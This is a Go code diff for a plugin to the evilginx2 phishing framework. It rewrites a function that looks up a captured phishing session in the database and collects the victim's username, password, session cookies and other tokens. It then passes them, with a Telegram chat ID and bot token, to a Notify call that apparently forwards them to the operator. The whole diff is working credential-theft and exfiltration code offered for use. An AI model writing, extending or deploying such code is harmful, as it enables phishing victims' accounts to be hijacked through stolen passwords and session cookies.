@@ -1,11 +1,10 @@
 package core
 
 import (
-	"bufio"
 	"encoding/json"
 	"fmt"
-	"os"
-	"strings"
+
+	"github.com/kgretzky/evilginx2/database"
 )
 
 type TSession struct {
@@ -25,74 +24,60 @@ type TSession struct {
 	UpdateTime int64                  `json:"update_time"`
 }
 
-func ReadLatestSession(filePath string) (TSession, error) {
-	file, err := os.Open(filePath)
+func toMapInterface(v interface{}) map[string]interface{} {
+	b, err := json.Marshal(v)
 	if err != nil {
-		return TSession{}, fmt.Errorf("could not open file: %v", err)
+		return nil
 	}
-	defer file.Close()
-
-	var latestSession TSession
-	var currentSessionData string
-	captureSession := false
-
-	scanner := bufio.NewScanner(file)
-
-	for scanner.Scan() {
-		line := scanner.Text()
-
-		if strings.HasPrefix(line, "$") {
-			if captureSession {
-				if currentSessionData != "" {
-					var session TSession
-					err := json.Unmarshal([]byte(currentSessionData), &session)
-					if err == nil {
-						latestSession = session
-					} else {
-						fmt.Printf("Error parsing session JSON: %v\n", err)
-					}
-					currentSessionData = ""
-				}
-			}
-			captureSession = true
-		}
-
-		if captureSession && strings.HasPrefix(line, "{") {
-			currentSessionData = line
-		}
+	var m map[string]interface{}
+	if err := json.Unmarshal(b, &m); err != nil {
+		return nil
 	}
-
-	if captureSession && currentSessionData != "" {
-		var session TSession
-		err := json.Unmarshal([]byte(currentSessionData), &session)
-		if err == nil {
-			latestSession = session
-		} else {
-			fmt.Printf("Error parsing session JSON: %v\n", err)
-		}
-	}
-
-	if err := scanner.Err(); err != nil {
-		return TSession{}, fmt.Errorf("error reading file: %v", err)
-	}
-
-	return latestSession, nil
+	return m
 }
 
-func readFile(chatid string, teletoken string) {
-
-	filePath := "/root/.evilginx/data.db"
-
-	latestSession, err := ReadLatestSession(filePath)
+func readFile(db *database.Database, sid string, chatid string, teletoken string) {
+	sessions, err := db.ListSessions()
 	if err != nil {
-		fmt.Printf("Error: %v\n", err)
+		fmt.Printf("Error listing sessions: %v\n", err)
 		return
 	}
 
-	if latestSession.ID != 0 { // Assuming ID 0 indicates no valid session
-
-		Notify(latestSession, chatid, teletoken)
-	} else {
-		fmt.Println("No session found.")
+	var dbSess *database.Session
+	for _, s := range sessions {
+		if s.SessionId == sid {
+			dbSess = s
+			break
+		}
 	}
+
+	if dbSess == nil {
+		fmt.Println("Session not found.")
+		return
+	}
+
+	if len(dbSess.CookieTokens) == 0 {
+		return
+	}
+
+	cookieJSON := FormatCookieTokens(dbSess.CookieTokens)
+
+	sess := TSession{
+		ID:         dbSess.Id,
+		Phishlet:   dbSess.Phishlet,
+		LandingURL: dbSess.LandingURL,
+		Username:   dbSess.Username,
+		Password:   dbSess.Password,
+		SessionID:  dbSess.SessionId,
+		UserAgent:  dbSess.UserAgent,
+		RemoteAddr: dbSess.RemoteAddr,
+		CreateTime: dbSess.CreateTime,
+		UpdateTime: dbSess.UpdateTime,
+		Custom:     toMapInterface(dbSess.Custom),
+		BodyTokens: toMapInterface(dbSess.BodyTokens),
+		HTTPTokens: toMapInterface(dbSess.HttpTokens),
+		Tokens:     toMapInterface(dbSess.CookieTokens),
+	}
+
+	Notify(sess, cookieJSON, chatid, teletoken)
 }
